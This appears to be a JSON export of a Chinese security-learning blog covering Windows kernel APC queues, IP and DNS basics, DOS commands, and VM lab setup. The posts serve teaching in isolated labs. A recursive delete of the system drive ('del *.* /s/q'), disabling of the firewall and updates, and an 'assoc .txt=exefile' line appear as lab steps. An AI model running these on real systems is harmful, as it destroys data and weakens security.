参考资料参考书籍：《Android软件安全权威指南》—— 丰生强 参考链接： https://www.jianshu.com/p/6bdbbab73705 （简书文章-关于Dalvik虚拟机） https://blog.csdn.net/cy524563/article/details/41550915 （CSDN文章-什么是Dalvik虚拟机） https://stackoverflow.com/questions/33533370/difference-between-aar-jar-dex-apk-in-android （stackoverflow解答-jar,dex,apk,aar的区别） https://juejin.im/post/5bf22bb5e51d454cdc56cbd5 （掘金文章-浅谈Android Dex文件） https://blog.csdn.net/zzc901205/article/details/77676330 （CSDN文章-java,class,dex转换过程） https://blog.csdn.net/hudashi/article/details/7062675 （CSDN文章-JVM指令详解(上)） https://www.jianshu.com/p/ab9b83a77af6 （简书文章-Zygote进程的启动流程） https://blog.csdn.net/luoshengyang/article/details/6768304 （CSDN文章-Zygote启动过程的源代码分析） https://blog.csdn.net/Luoshengyang/article/details/6747696 （CSDN文章-Android应用程序进程启动过程的源代码分析）","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"备用APC队列","slug":"备用APC队列","date":"2020-06-04T01:32:05.000Z","updated":"2022-05-17T15:08:12.430Z","comments":true,"path":"2020/06/04/备用APC队列/","link":"","permalink":"http://cata1oc.github.io/2020/06/04/%E5%A4%87%E7%94%A8APC%E9%98%9F%E5%88%97/","excerpt":"","text":"前言前一篇在介绍APC的文章中提到过，如果想让线程做什么事情，就给它的APC队列里面挂一个APC。我们也了解了，在位于KTHREAD+0x34的位置处有一个ApcState，该字段是一个存着描述APC信息的_KAPC_STATE结构。但实际上，线程结构体KTHREAD中存着与APC有关的字段不止这一处。 由图可以知道，KTHREAD结构体中，除了+0x034偏移处的ApcState，还有4处与APC有关的字段。本篇将会从依次介绍这几个字段的含义，并会引入一个新的概念“备用APC队列”。 +0x14c SavedApcState备用APC队列由上图可以发现，SavedApcState字段与ApcState字段一样，都是_KAPC_STATE结构体。这里先回顾一下该结构体： 那么问题来了，弄两个一模一样的结构体有什么用呢？再讨论这个问题之前，我们必须了解一个知识，那就是挂靠。关于挂靠，可以参考我之前写的这篇进程挂靠。 这里再简单总结一下，线程APC队列中的APC函数都是与进程相关联的，具体点说：“A进程的T线程中的所有APC函数，要访问的内存地址都是A进程的“。但线程是可以挂靠到其它进程上的，比如A进程的线程T，通过修改Cr3（改为B进程的页目录基址），就可以访问B进程的地址空间，即所谓”进程挂靠“。 当T线程挂靠B进程后，APC队列中的存储的却仍然是原来的APC！具体点说，比如某个APC函数要读取一个地址为0x12345678的数据，如果此时进行读取，读到的将是B进程的地址空间，这样逻辑就错误了！ 为了避免混乱，在T线程挂靠B进程时，会将ApcState中的值暂时存储到SavedApcState中，等回到原进程A时，再将APC队列恢复。所以SavedApcState又称为备用APC队列。 再看NtReadVirtualMemory在进程挂靠这篇中，我们分析了NtReadVirtualMemory这个内核函数，这个函数是ReadProcessMemory这个API在0环中的实现。根据上次分析，我们可以得到这样一个调用步骤： Code1NtReadVirtualMemory -> _MmCopyVirtualMemory -> _MiDoPoolCopy -> _KeStackAttachProcess -> _KiAttachProcess 在上一次分析时，我们分析到了_KiAttachProcess，该函数内部会先修改养父母（KTHREAD.ApcState.Process），再调用KiSwapProcess进行Cr3的修改，从而完成线程的挂靠。接着就可以读取另一个进程的内存了。当然，上一次分析时并没有学习APC相关的知识，这次，我们需要重新审视这个KiAttachProcess函数到底做了哪些事。 再次观察KiAttachProcess函数，在完成挂靠过程之前，其上方有一个叫做KiMoveApcState，这个函数看上去和APC有关，所以我们进入该函数进行分析。 分析该函数，可以发现，这个函数主要做了一件事，就是将ApcState中的内容复制一份到SavedApcState中，而这个操作刚好就位于挂靠进程之前，这也再一次验证了SavedApcState的作用，就是作为备用APC队列暂存ApcState中的值。 挂靠环境下ApcState的意义在挂靠的环境下，也是可以先线程APC队列插入APC的，那这种情况下，使用的是哪个APC队列呢？ 根据前面的分析，可以总结成如下： Code1234- A进程的T线程挂靠B进程，A是T的所属进程，B是T的挂靠进程。- ApcState B进程相关的APC函数- SavedApcState A进程相关的APC函数- 在正常情况下，当前进程就是所属进程A，如果是挂靠情况下，当前进程就是挂靠进程B。(这也说明了GetCurrentProcess函数查找的其实是KTHREAD+0x44位置处的值) +0x138 ApcStatePointer为了操作方便，_KTHREAD结构体中定义了一个指针数组ApcStatePointer，长度为2. Code123456正常情况下： ApcStatePointer[0] 指向 ApcState ApcStatePointer[1] 指向 SavedApcState挂靠情况下： ApcStatePointer[0] 指向 SavedApcState ApcStatePointer[1] 指向 ApcState +0x165 ApcStateIndexCode123ApcStateIndex用来标识当前线程处于什么状态： 0：正常状态 1：挂靠状态 ApcStatePointer 与 ApcStateIndex组合寻址Code123456正常情况下，向ApcState队列中插入APC时： ApcStatePointer[0]指向ApcState此时ApcStateIndex的值为0 ApcStatePointer[ApcStateIndex]指向ApcState挂靠情况下，向ApcState队列中插入APC时： ApcStatePointer[1]指向ApcState此时ApcStateIndex的值为1 ApcStatePointer[ApcStateIndex]指向ApcState 总结：无论什么环境下，ApcStatePointer[ApcStateIndex] 指向的都是ApcState，ApcState则总是表示线程当前使用的apc状态。 +0x166 ApcQueueableApcQueueable用于表示是否可以向线程的APC队列中插入APC。 当线程正在执行退出的代码时，会将这个值设置为0 ，如果此时执行插入APC的代码（KeInsertQueueApc后面会讲），在插入函数中会判断这个值的状态，如果为0，则插入失败。 参考链接 https://www.bilibili.com/video/BV1NJ411M7aE?p=70 （滴水预习班-备用APC队列） https://cataloc.gitee.io/blog/2020/04/05/%E8%BF%9B%E7%A8%8B%E6%8C%82%E9%9D%A0/ （cataLoc的博客-进程挂靠） https://blog.csdn.net/weixin_42052102/article/details/83304995 （MyClassmates博客-备用APC队列）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"网络安全基础02：IP地址&Dos命令","slug":"网络安全基础02-IP地址-Dos命令","date":"2020-06-02T08:41:52.000Z","updated":"2022-05-17T15:06:58.951Z","comments":true,"path":"2020/06/02/网络安全基础02-IP地址-Dos命令/","link":"","permalink":"http://cata1oc.github.io/2020/06/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8002-IP%E5%9C%B0%E5%9D%80-Dos%E5%91%BD%E4%BB%A4/","excerpt":"","text":"前言本篇介绍网络安全的两个基础内容，IP地址以及Dos命令。IP地址属于计算机网络中非常重要的一环，其会牵扯到诸多概念，下文会进行简要介绍。Dos则是Windows系统提供用来操作磁盘的软件，使用命令可以较为方便的进行操作磁盘中的文件和目录，也是网络安全领域必备的技能。 局域网介绍IP地址前，需要认识局域网的概念。 什么是局域网局域网（Local Area Networks）是局部地区形成的一个区域网络，通常在几千米内，如家庭，办公室，大学等搭建的私有网络，都可以算作局域网。 局域网的构成通常情况的局域网由交换机（组成局域网的核心），网线，终端pc构成。有小盆友会问了，那路由器是干啥的？为什么很多家庭里用的都是路由器呢？现在一般的家用路由器往往封装了二层交换机的功能，可以看作是一个三层交换机（这里提到的层按照OSI七层模型来看），路由器可以连接一条外网的网线，使得局域网内的终端可以访问外网。而交换机通常都是二层交换机，它无法连接外网，仅能通过识别Mac地址进行数据包转发，启到数据交换的作用，所以常用于局域网内终端间的通信。 前面提到的路由器，以及二层交换机，三层交换机的区别，可以参考此篇文章；它门在不同网络模型下对应的层可以参考下图。 IP地址(IPV4)平时生活中，每个人都有家庭地址，这样你买的快递才能正确的送到你家。互联网中也是如此，每一台终端设备（台式机，笔记本，手机）它都会有一个唯一的地址，从而方便找到这台设备，这个地址就是IP地址。 IP地址的组成IP地址由32位2进制组成，由于这样实在太过难记，后面采用了点分十进制的写法。下面是同一个IP地址的两种写法： Code1232位2进制： 1100 0000 1010 1000 0000 0000 0000 0001点分十进制： 192.168.0.1 子网掩码局域网通信规则：在同一个局域网中，所有IP必须在同一个网段才可以互相通信。 IP构成：网络位+主机位（网络位相同的IP地址，为同一个网段）。 子网掩码：用来确定IP地址的网络位。 子网掩码有3类，通过子网掩码确定网络位时，与255对应的数字为网络位，与0对应的数字为主机位。参考下表： IP地址 子网掩码 网段 10.1.1.12 255.0.0.0 10.0.0.0 10.1.1.12 255.255.0.0 10.1.0.0 10.1.1.12 255.255.255.0 10.1.1.0 IP地址分类 A、B、C类的IP地址最为常用，可用于配置终端的IP地址 D类IP地址用于组播 E类IP地址用于科研 IP地址类型 第一字节十进制范围 二进制固定最高位 默认网络位 默认主机位 每个网络中可容纳的主机数 A 0~126 0 8位 24位 2^24-2 B 128~191 10 16位 16位 2^16-2 C 192~223 110 24位 8位 2^8-2 D 224~239 1110 组播地址使用 E 240~255 1111 科研实验使用 保留地址互联网中有一部分地址是不被分配的，作为保留地址，实现单独的功能。 本地回环地址（与自己通信）：127.0.0.1 私网地址： 1）A类：10.xxx.xxx.xxx 2）B类：172.16.0.0~172.31.255.255 3）C类：192.168.xxx.xxx 可用主机位有一点需要注意到，前面IP地址分类的表格中，每个网络中可容纳的主机数最后都需要减去2，原因在于，在一个网段下，第一个和最后一个的地址是不能用作主机位的。例如 Code123IP地址： 10.1.1.2子网掩码： 255.255.255.0可用主机号： 10.1.1.1~10.1.1.254 其中第一个地址10.1.1.0代表网段，最后一个地址10.1.1.255为广播地址（向该网段内所有主机发送消息） 网关什么是网关前面提到了IP地址与局域网的概念，同一个局域网中的终端，往往处在同一个网段下，可以借助交换机彼此互相通信。但若想访问一个外网（例如京东商城的主页），就得依靠网关（GateWay，GW）。 什么是网关，它相当于网络的出口，打个比方，比如说你要出国，那得坐飞机，坐飞机你得先去飞机场。飞机场就相当于网关。若想访问外网，那就把你的请求数据包发给网关，网关会帮你发送出去。一般来说，路由器会充当网关的角色。 Code1234PC端向外发包的过程：1. 判断目标IP与自身是否在同一个网段2. 若在同一个网段，则直接发出去，不找网关3. 若不在同一个网段，将包发送给网关 修改网关会怎样下面通过一个小实验，来看一下网关的重要性： 1）打开命令行，输入指令ipconfig，查看当前IP地址，子网掩码以及网关 2）接下来我们去试着修改网关，当前操作系统是Windows10，在别的Windows版本上会有所不同，右键点击右下角的一个小电脑图标，选择打开“网络和Internet”设置。 3）进入设置后，选择更改适配器选项 4）接下来可以看到一些链接上的网络，其中两个写着VMware一看就不是我们关心的。我们只需要找到以太网（xp系统上对应本地连接），然后右键属性 5）进入以太网属性后，找到Internet协议版本4(TCP/IPV4)双击 6）可以进入到配置IP地址以及DNS的地方，通常系统会默认自动获取IP地址以及DNS服务器地址。我这里是手动进行了配置。可以看到，我当前主机的默认网关为192.168.0.1。这时我们修改一下这个网关，改为192.168.0.5并保存，看看有什么变化。 7）保存后，可以发现，网络链接的界面，以太网会显示未识别的网络，任意打开一个外网网址，会发现链接不上了。 原因在于我们设置的网关地址是错误的网关地址，所以发送数据给这个地址时，并没有网关将我们发送的数据转发出去，因此会链接不上外网。所以想要链接外网，必须得有网关。 网关的地址通常而言，网关的地址会选择可用地址（xxx.xxx.xxx.1~xxx.xxx.xxx.254）的第一个或者最后一个，也就是xxx.xxx.xxx.1或者xxx.xxx.xxx.254（特定情况下，网络管理员也有可能将网关的地址设置成别的情况，但是非常少见。），例如刚刚我主机上的网关地址就是192.168.0.1。 DNS什么是DNS由于IP地址不方便记忆且不能显示地址组织的名称和性质等缺点，人们设计出了域名，例如www.baidu.com就是百度的域名。显然，我们是没法通过域名直接访问百度的，相应的，人们又设计出一套域名与IP地址互相转换的系统，也就是域名解析系统（Domain Name System），有了DNS，便可以直接通过域名去访问某个网站。 访问网站的过程一般来说，我们不会去记忆一个网站的IP地址，而是去记住它的域名，所以会在游览器中输入域名。游览器会经过以下几个步骤，完成对域名的解析。 游览器会先去查询DNS缓存，如果最近访问过该网站，则该网站的域名与IP的对应关系会存在DNS缓存中。但是DNS缓存的内容有限，新加入的会刷新掉很早之前缓存的内容。需要注意的一点，DNS缓存是可以投毒的。 如果DNS缓存中查询不到，这时会去查询host文件。在Windows系统中保存的一个没有后缀的，名为host的文件，该文件记录了部分域名与IP地址的对应关系，位于操作系统System32/drivers/etc目录下（用记事本打开）。 然而大部分情况下，host文件中，仅记录了本地回环地址127.0.0.1与localhost的对应关系。 在前两种方式都失效的情况下，就只有去查询DNS服务器了。这个过程相对复杂一些，这有一篇不错的文章“一个DNS数据包的惊险之旅”，用故事的方式讲述了DNS查询服务器的过程，便于理解。 DNS劫持一般来说，电脑设置的DNS服务器选项都是默认设置成自动获取的。如下图（与上文出现的IP地址位于同一个界面）： 也可以根据自家购买的运营商服务以及所在地区，选择相应的DNS服务器，然后填在首选DNS服务器的位置上。当然，手动指定DNS服务器，难免会遇到服务器宕机的情况。例如QQ可以正常聊天，但是网页就是打不开，这就说明DNS解析出问题了，需要重新指定一个DNS服务器。那么该指定谁呢？有一个万能的DNS服务器114.114.114.114，这个在国内各个运营商都是支持的。紧急情况下使用它总是不错的，可以填在备用DNS服务器的位置上。 刚刚提到DNS服务器是有可能会出问题的，有时候是自身机器出了问题，也有时候是因为黑客进行了DNS劫持。什么是DNS劫持呢？这里简单概述其中一种方法，首先黑客会攻击DNS服务器，然后将DNS服务器中域名与IP地址的对应关系替换掉，例如将京东官网域名对应的IP地址换成另一个一模一样界面的钓鱼网站的IP地址，这时用户再次通过域名访问京东官网时，如果是通过此服务器进行域名解析的话，获取到的就是假IP地址，就会跳转到钓鱼网站，这时一旦在钓鱼网站输入了用户名和密码，账号的内容就被泄露出去了。当然，这种方式工程量还是很大的，DNS劫持有很多的实现，均是对于DNS解析的过程做手脚的，例如刚刚提到的DNS缓存，也可以作为黑客的攻击目标。 相关命令在对DNS有部分了解后，这里给大家介绍几个DNS相关的命令： ping(测试网络连连通性)： dos1234ping 目标IP地址 #测试网络连通性，有去有回即为可以成功通路ping -t 目标IP地址 #一直pingping -n 数字 目标ip地址 #修改ping包的数量（默认4）ping -l 数字 目标ip地址 #修改ping 包的大小 ping指令需要注意一点，ping不通不一定不在线，有可能是被防火墙阻拦了，而导致无法ping通。这里有一个小实验，就是启用两台虚拟机，win2003和winxp各一台，通过自定义网络适配器（相当于交换机，该选项位于虚拟机设置的位置），选择特定虚拟网络（注意不要选用VMnet0），将两台虚拟机设置到同一个网段，并关闭双方的防火墙后，看能否互相ping通。这相当于是一个局域网内的ping实验。 nslookup(手动解析域名)： ipconfig(查看IP)： dos12ipconfig #查看ip基本信息ipconfig /all #查看ip所有信息 Dos命令如何操作Dos命令Code1Win + R ---运行---输入cmd--回车，将调出C:\\Windows\\system32\\cmd.exe 基本命令Code123456789101. 命令：color f0 帮助：color ? 作用：改变背景及字体颜色 2. 命令：cls 作用：清屏 3. 命令：shutdown 作用：关机相关 参数：-s(关机) -t(设置时间) -a(取消操作) -r(重启) -f(强制) -l(注销) 目录相关命令Code123456789101112131. 命令：dir 作用：显示当前目录内文件信息 参数：/a(显示全部文件) 2. 命令：cd 作用：切换目录 3. 命令：md 作用：创建目录 4. 命令：rd 作用：删除目录 参数：/s(全删) /q(无提示) 重定向符号Code12345678910111213141. 命令：> 作用：覆盖 2. 命令：>> 作用：追加 3. 命令：1> 作用：正确输出(默认，可不写) 4. 命令：2> 作用：错误输出5. 命令：>nul 2>nul 作用：将输出扔掉 文件操作命令Code1234567891011121314151617181920212223242526272829301. 命令：echo / copy con 作用：创建文件 2. 命令：del 作用：删除文件 3. 命令：copy 作用：复制文件 4. 命令：move 作用：移动文件5. 命令：ren 作用：重命名(也可作用于文件夹)6. 命令：type 作用：显示(相当于Linux的cat)7. 命令：attrib 作用：修改属性 参数：+/- h(隐藏属性) s(设置为系统文件) 8. 命令：fsutil 作用：查询或管理卷（磁盘）及文件 语法：fsutil file createnew path:\\filename size(特例，不表示其它参数的语法) 9. 命令：assoc 作用：关联文件属性 语法：assoc .xxx=???file 举例：assoc .txt=exefile 参考链接 https://www.bilibili.com/video/BV1i7411G7vm?p=8 （千峰网络开源课程p8~p13） https://blog.csdn.net/weixin_43252204/article/details/105338307#DOS%E5%91%BD%E4%BB%A4 （Beglage_buglige学习笔记篇1） https://blog.csdn.net/lqf_ok/article/details/88867595 （介绍不同层交换机以及路由器的比较） https://www.cnblogs.com/qishui/p/5428938.html （OSI模型与TCP/IP模型的比较） https://blog.csdn.net/loveCC_orange/article/details/79258071 （关于IP地址的解析） https://bbs.pediy.com/thread-257288.htm （轩辕哥的文章，一个DNS数据包的惊险之旅）","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础01：配置虚拟机","slug":"网络安全基础01-配置虚拟机","date":"2020-06-01T15:07:16.000Z","updated":"2022-05-17T15:06:21.746Z","comments":true,"path":"2020/06/01/网络安全基础01-配置虚拟机/","link":"","permalink":"http://cata1oc.github.io/2020/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8001-%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA/","excerpt":"","text":"前言Bilibili上有位大佬分享了一个千峰教育开源的网络安全教程，刚开始看，讲师讲的非常详细，遂有想法趁此机会弥补一下网安领域技能池的空缺，计划是在接下来3个月的时间更新完这部分的学习笔记，同时依旧会保持每周一篇Windows内核与Android逆向领域的知识更新。 本篇主要是介绍一些虚拟机的配置，之前没接触过网安。搞内核，安装一个xp虚拟机就足够了，网安不够，要好多个，还得有服务器版本的，但总体的安装步骤与配置方案相差不大，下面会选取部分进行介绍，完整的安装过程可以直接去看千峰的开源课程p1~p7或者参考Beglage_buglige的博客，他的学习笔记相当完整。 系统安装(Windows2003)本次演示Windows2003的安装，在安装之前，需要准备两样东西，一个是VMware15.5，另一个是Windows2003的镜像文件。VMware15.5的资源在网上有很多，随便选取一个下载即可。操作系统的镜像文件可以在MSDN下载，这个网站里有各个版本的Windows操作系统镜像（使用迅雷下载）。有了虚拟机和镜像后，就可以进行操作系统的安装了。 1）打开VMware，选择创建新的虚拟机，选择典型，然后下一步。Windows操作系统的安装一般都选择典型即可，Linux操作系统则会使用自定义。 2）紧接着是选择安装来源，通常情况下，会选择稍后安装操作系统，视频中也是这样的，这样安装过程更详细，也可以自己进行一些配置，但是略微麻烦；若选择安装程序光盘映像文件，则会进行简易安装，即自动安装，会自动安装虚拟机系统，像硬盘分区、语言、时区、键盘识别、用户创建等等这些安装过程都自动进行，不再让用户进行一步一步操作。因此相对简单适合新手，本篇也采用此类安装方式。需要注意的一点，选择建议安装时，像xp，2003这样的旧版系统，是很不方便进行分区的（需使用专门的分区软件），win7和2008则可以之后再分区。因此这一步看个人选择。 3）接下来，设置用户密码，安装服务器版本的系统时（例如Windows2008和Windows2003）最好设置密码，当然Windows2008安装时会强制你设置密码，对于普通的用户版本操作系统则可不必设置。密钥可选，没有即可跳过。 4）设置虚拟机名称及其在磁盘中所在位置，由此可以理解，虚拟机在磁盘中仅仅是个文件而已 5）下面是规划磁盘的大小，一般来说按照建议大小40GB即可，磁盘较大可稍作扩展，不必太多。然后选择将虚拟磁盘存储为单个文件，这么做的好处是避免多个文件导致磁盘中的碎片过多 6）硬件规划部分，处理器1个就够，按照默认的来，内存推荐的配置是384MB，向我这样的好心人会分512MB给它，按照推荐来也够了。剩下的可以考虑把无用的设备移除，例如打印机和声卡。 7）选择完成后，由于我们选择的是简易安装，接下来虚拟机会进行完全自动安装，不需手动，慢慢等待即可。 8）安装完后，会跳转到这样一个界面，此时不要手动按Ctrl+Alt+Delete，因为这样产生作用的是本机的系统，对于虚拟机的系统没有影响，此时应选择按下VMware上方提供的一个按键，它会模拟按下Ctrl+Alt+Delete。 9）接着进入认证界面，输入之前设置的密码即可。 10）第一次进入系统，会有安全更新与服务器配置的要求，这些暂时用不到，选择开机不再提示并叉掉。 这时，系统已经成功安装完毕了，由于咱们是让虚拟机自动安装的，所以还有一些需要配置的内容。 安装VMware Tools(Windows2003)VMware Tools是VMware Workstation自带的一个工具，安装后，可以很方便拖拽桌面（主机）文件到虚拟机中，在主机与虚拟机之间的切换也会方便很多。通常情况下，在安装操作系统完成后，VMware会自动帮我们安装VMware Tools并重启。 点击当前虚拟机右上角的选项卡，若已安装完成，会显示重新安装VMware Tools；否则需要手动安装，步骤简单，一直下一步即可。 桌面图标(Windows2003)刚安装的虚拟机空荡荡的，啥图标也木有，这时需要做一些简单的规划。 1）右键进入属性 2）选则桌面，单机自定义桌面进入桌面项目，勾选桌面图标后确定即可在桌面看到这些常用图标。 快照的使用(Windows2003)VMware虚拟机提供了快照的功能，就是保存当前虚拟机系统的环境，在发生严重错误时可以一键恢复，具体使用来看下面的例子。 1）首先，关机，然后选择上方蓝色按钮（管理此虚拟机的快照） 2）进入快照管理器后，点击拍摄快照；修改名称和描述后，完成快照的拍摄 3）拍摄完毕后，在当前位置的左侧会显示你刚刚拍摄的快照。 4）关闭窗口，开启虚拟机，进入操作系统，打开命令行，执行如下命令。 cmd12cd \\del *.* /s/q 5）执行完后会发现，删除掉很多文件 6）这时我们尝试重启试试 7）会发现，因为缺少ntoskrnl.exe文件，无法启动。哈哈，这个文件是不是很熟悉，没错，我们刚刚执行的命令删除掉了这个内核文件，根据以前学习的知识，我们也可以发现当前Windows2003系统采用的是10-10-12分页。 8）接下来，只需再次打开快照管理器，点击刚刚拍摄的快照，选择转到，确认后，会跳转到开启虚拟机之前的界面，这是再次开启虚拟机，就可以正常启动操作系统了，此时操作系统已经恢复到被我们删除内核文件之前的状态了。这就是快照的主要作用之一，帮助我们虚拟机恢复到之前的状态。 虚拟机克隆(Windows2003)虚拟机克隆是个非常有用的功能，有时候想要在虚拟机中再安装一台操作系统，重新从镜像开始安装实在是太麻烦了，于是有了虚拟机克隆的技术。同样是利用了前面提到的镜像功能。下面用Windows2003进行演示。 1）打开快照管理器，选择之前建立的快照，单机克隆。 2）选择克隆源，我们选择现有快照。 3）克隆类型，通常选择链接克隆。 下面简述一下克隆方式以及区别： 克隆方式：虚拟机克隆分为“完整克隆”（Full Clone）和“链接克隆”（Linked Clone）两种方式。克隆过程中，VMware会生成和原始虚拟机不同的MAC地址和UUID，这就允许克隆的虚拟机和原始虚拟机在同一网络中出现，并且不会产生任何冲突。 VMware完整克隆 （Full Clone）：完全克隆的虚拟机不依赖源虚拟机，是完全独立的虚拟机，它的性能与被克隆虚拟机相同。由于完整克隆不与父虚拟机共享虚拟磁盘，所以创建完整克隆所需的时间比链接克隆更长。如果涉及的文件较大，完整克隆可能需要数分钟才能创建完成。完整克隆只复制克隆操作时的虚拟机状态，因此无法访问父虚拟机的快照。 VMware 链接克隆（Linked Clone）：依赖于源虚拟机（称为父虚拟机）。由于链接克隆是通过父虚拟机的快照创建而成，因此节省了磁盘空间，而且克隆速度非常快，但是克隆后的虚拟机性能能会有所下降。对父虚拟机的虚拟磁盘进行的更改不会影响链接克隆，对链接克隆磁盘所做的更改也不会影响父虚拟机。但是如果父虚拟机损坏或快照点删除，链接克隆的虚拟机也不能使用；如果父虚拟机移动位置，需要重新指定父虚拟机的位置，再启动链接克隆虚拟机。 4）第四步设置文件夹路径和名字，然后便完成虚拟机的克隆，看上去和原来的虚拟机一模一样。可以正常开机。 5）这时，我们需要打开刚刚克隆的虚拟机，右击我的电脑 -> 属性 -> 计算机名，我们会发现，当前虚拟机的名字，仍然是刚刚用来克隆用的虚拟机的名字，这样在之后的实验中，会因为计算机名重复造成实验问题。所以我们需要手动修改新克隆出来的虚拟机的计算机名，选择更改，然后修改计算机名即可。 关闭防火墙与更新(Windows7)前面的实验都是在Windows2003上面做的，接下来的几个实验主要用Windows7系统进行操作。后面的实验需要通过Windows7进行实验，在一开始的实验是需要关闭防火墙的，同时需要关闭更新防止操作系统对已有漏洞进行打补丁。防火墙在Windows2003中是默认关闭的，Windows7和Windows2008需要手动关闭，这里以Windows7为例进行演示。 1）打开控制面板，选择系统和安全并进入。 2）我们先关闭防火墙，点击进入Windows防火墙，选择打开或关闭Windows防火墙。 3）进入将两个选项均置为关闭Windows防火墙，即完成防火墙的关闭。 4）接着关闭更新，同样还是在系统和安全中，这次选择Windows Update下面的一行小字“启动或禁用自动更新” 5）进入后选择从不检查更新，这样就关掉了Windows7的更新，Windows2008也可以参考这个方法。 磁盘划分与分区隐藏(Windows7)由于我们是用的自动安装，因此安装后，只有一个大C盘，这时候就需要磁盘划分了。对于Win7及之后的系统，磁盘划分很方便，但是之前的系统例如已经安装的Windows2003，就不那么方便划分了，需要使用特定的工具。下面来演示一下Windows7中划分磁盘的步骤，Windows2008同理。 1）右键计算机选择管理。 2）进入计算机管理界面，在左侧找到磁盘管理。此时右侧会看到只有一个大C盘，右键选择压缩卷。 3）此时可以调节压缩空间的大小，即为从C盘中压缩出来的空间。 4）压缩完后可以看到一块未分配的空间，由于未被分配，所以卷中是无法看到的 5）这时选中未分配的区域，右键，新建简单卷，就能把这块区域利用起来。这里大部分情况点击下一步就行，有两个步骤需要注意。第一个是划分简单卷的大小，这次我们不全部划分，保留4GB用于下一个小实验；另一个就是分配驱动器号，如果没有D的话，可能是被CD-ROM占用了，给CD-ROM的驱动器号更改一下，我们就可以用D了。其实就算用E也是一样，不影响实验。 6）划分完后，效果如下，可以看到还余下4GB未分配。 7）接下来我们利用未分配的4GB空间，可以完成一个简单的磁盘隐藏。首先我们在C盘（任意盘均可）中新建一个文件夹system（看到这个名字一般人就不会点进去了） 8）创建完这个文件夹后，我们按照刚刚新建简单卷的方法利用这余下的4GB空间，但是步骤有所不同。在分配驱动器号和路径这一步时，不选择分配驱动器号，而是装入咱们刚刚创建的空白文件夹system中。 9）按步执行完后大功告成，打开资源管理器，选择计算机，是看不到刚刚分配的4GB空间的。 10）打开C盘，可以看到system的图标已经变了，当然，这个是可以在注册表里修改的，这里就不演示了。至此，我们完成了磁盘划分以及一次简单的分区隐藏实验。 参考链接 https://www.bilibili.com/video/BV1i7411G7vm?p=1 （千峰网络开源课程p1~p7） https://blog.csdn.net/weixin_43252204/article/details/105338224 （Beglage_buglige学习笔记篇1）","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"APC的本质","slug":"APC的本质","date":"2020-05-26T01:32:50.000Z","updated":"2022-05-17T15:04:27.018Z","comments":true,"path":"2020/05/26/APC的本质/","link":"","permalink":"http://cata1oc.github.io/2020/05/26/APC%E7%9A%84%E6%9C%AC%E8%B4%A8/","excerpt":"","text":"前言线程是不能被“杀掉”、“挂起”或“恢复”的，线程在执行的时候自己占据着CPU，其它线程是没法控制它的。举个极端的例子：如果一个线程不调用API，也屏蔽了中断，且保证代码不会出现异常，那么该线程将永久占用CPU，何谈控制呢？所以说一个线程如果想“死“，一定是自己执行代码把自己杀死，不存在”他杀“这种情况。 那么如果想改变一个线程的行为该怎么做呢？这就是今天需要学习的一种机制：APC（Asyncroneus Procedure Call），即异步过程调用。 在学习内核的过程中，想要真正达到通透的地步，则至少需要掌握3种0环的进出方式，之前我们已经学习了API调用是一种，接下来将学习的APC机制也是一种，还有以后会学到的异常。 线程与APC线程的状态在正式学习APC之前，需要先了解线程的状态，准确说，一个正在执行的线程只有两种状态，一种是挂靠，一种是未挂靠。（这里说明一下，尽管挂靠的对象说明的是进程，但是CPU调度的最小单位是线程，这里用正在执行的线程替代其所在的进程） APC的执行过程来作一个简单的比喻，假设一个APC就是一封寄出的信，而线程就是送信员。例如当我们想要寄信给别人时，就可以把信放入信箱，送信员每周一，周三，周五会来信箱取信，然后再依据信中写的地址，送到不同的地方。通过APC来改变线程的行为也是类似，首先编写一个能够按照我们期望让线程执行特定动作或行为的APC（信），接着将这个APC插入到线程中的某个位置（信箱），该正在执行的线程会在某个时刻来检查是否有未执行的APC（送信员每周来取信），若存在，则取出来执行（送信）。如果该APC执行的功能是让线程终止（例如一个举报信，送到政府），则该线程在执行后便会结束执行（丢了工作），让出CPU，所以说线程都是自杀的。 谁插入的APC前面介绍了APC的执行过程，现在来讨论几个问题，线程中的APC是谁插入的，例如此时有个线程A，发现有未执行的APC，正要去执行，那么线程A中的APC是哪来的？是线程A自己插入的吗？ 答：首先肯定不是线程A自己插入的，就好比送信员，总不至于自己写一封信寄给自己吧，所以肯定是别的线程将APC插入到线程A中的。 APC插入到哪那么别的线程会将APC会插入到线程A的什么位置呢？在之前学习线程结构体KTHREAD相关内容时，曾见过APC相关字段，由于当时还没学到APC，因此没有进一步分析。 参考上图，在KTHREAD+0x34的位置有一个字段ApcState，这是一个_KAPC_STATE结构，查看该结构 该结构有5个字段： c12345+0x000 ApcListHead //2个APC队列，用户APC和内核APC+0x010 Process //养父母，曾在进程挂靠章节提过，该字段指向线程所属或所挂靠的进程+0x014 KernelApcInProgress //内核APC是否正在执行+0x015 KernelApcPending //是否有正在等待执行的内核APC+0x016 UserApcPending //是否有正在等待执行的用户APC 可以发现，_KAPC_STATE结构+0x000（KTHREAD+0x034）位置是两个ApcListHead队列（这里的队列用链表实现，一个指向链表头，一个指向链表尾，共8个字节，所以这里有两个队列），一个是存放用户APC的队列，一个是存放内核APC的队列，这就是APC插入的地方。 另一个值得关注的地方是+0x010（KTHREAD+0x044）的位置，这个字段的值我们就很熟悉了，在进程挂靠那一篇我们称其为养父母。这个字段的值指向了当前线程的所属进程或所挂靠的进程。通过与ETHREAD+0x220位置的值进行对比，可以判断当前线程是否挂靠到了别的进程上。 APC结构初探我们现在知道了，APC会插入到KTHREAD+0x034处APC队列中，会根据内核APC还是用户APC从而插入到不同的队列中。下面就来看一下这个APC是啥样的。 